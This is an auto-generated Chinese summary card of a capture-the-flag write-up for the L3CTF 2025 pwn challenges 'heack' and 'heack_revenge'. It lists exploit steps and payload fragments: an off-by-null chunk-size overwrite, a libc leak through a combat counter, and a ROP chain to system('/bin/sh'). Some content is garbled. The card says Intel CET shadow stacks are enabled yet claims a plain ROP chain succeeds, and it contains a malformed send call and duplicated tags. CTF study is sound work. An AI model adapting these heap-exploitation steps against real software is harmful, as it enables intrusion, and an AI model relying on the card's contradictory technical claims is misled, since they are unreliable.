---
title: "Pwn - L3CTF 2025 heack & heack_revenge"
category: pwn
tags: ["L3CTF 2025", "pwn", "pwn", "shstk", "ibt", "full-relro"]
signals: ["L3CTF 2025 2025", "pwn", "shstk", "ibt", "full-relro", "canary", "pie", "dragon-game", "off-by-null", "rop", "L3CTF", "heack", "heack_revenge", "RPG"]
difficulty: hard
source: "https://www.ctfiot.com/261704.html"
tools: ["ROP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# Pwn - L3CTF 2025 heack & heack_revenge

> 赛事：L3CTF 2025 2025 | 方向：pwn | 难度：hard | 工具：ROP

## 一句话总结

L3CTF 2025 heack/heack_revenge：RPG 风格 PWN 菜单 + SHSTK/IBT 双重 CET 加固 + off-by-null 改 chunk size + 累加 combat_power 泄 libc + ROP 链。

## 攻击链

1. heack: amd64-64-little + Full RELRO + Canary + PIE + SHSTK + IBT (Intel CET)
2. 主题 RPG：菜单 1/2/3/4 (Write/Destroy/View/Exit) + Attack Training
3. over() 输入 0x103 字节 + p8(0x17) 改 chunk size
4. io.send(p16(0x591A)) 写入 rbp/canary 等
5. io.recvuntil b''[Attack]: '' 泄 libc_base = 0x204643
6. payload = a*0x103 + p8(0x17) + p64(rdi+1) + p64(rdi) + p64(bin_sh) + p64(system)
7. heack_revenge: Full RELRO+Canary+PIE+SHSTK+IBT 全部加强
8. 严格 add(0x500) / free(1) / add(0x4e0) / add(0x100) 触发 unsorted bin
9. over(b'a'*0x23 + p8(0x37) + p8(0x6a)) off-by-null 改 chunk size
10. io.sendlineafter('>', '2') Attack Training 触发 v4 累加
11. io.recvuntil('[Attack]:') 泄 libc_base = 0x203b31
12. add(0, 0x10, "X"*0x10) 准备 0xc0 堆块
13. for i in range(10) io.sendlineafter(">", "2") 累加 combat_power
14. rop = p64(ret)*2 + p64(rdi) + p64(binsh) + p64(system)
15. add(0, 0xc0, "X"*0x20+rop) 写 ROP
16. io.sendlineafter("445") 退出触发

## 关键 payload

```
over(b'a'*0x23+p8(0x37)+p8(0x6a)) + b'a'*0x20+rop (rdi+1+rdi+/bin/sh+system)
```

## 经验教训

堆块 size 字段 off-by-null + 累加 training 计数器泄 libc 是关键；SHSTK/IBT 阻挡 ret2libc 需用 ROP+ret 多次堆栈对齐；add 0x20 字节边界非常严苛 (0x103 + p8(0x17) 是 0x104 字节)。

## 标签

pwn、shstk、ibt、full-relro、canary、pie、dragon-game、off-by-null、ret2libc、xor-leak、house-of-?

## 参考来源

- https://www.ctfiot.com/261704.html
- 原文件：Pwn题解析｜L3CTF_2025_heack_&_heack_revenge.full.md
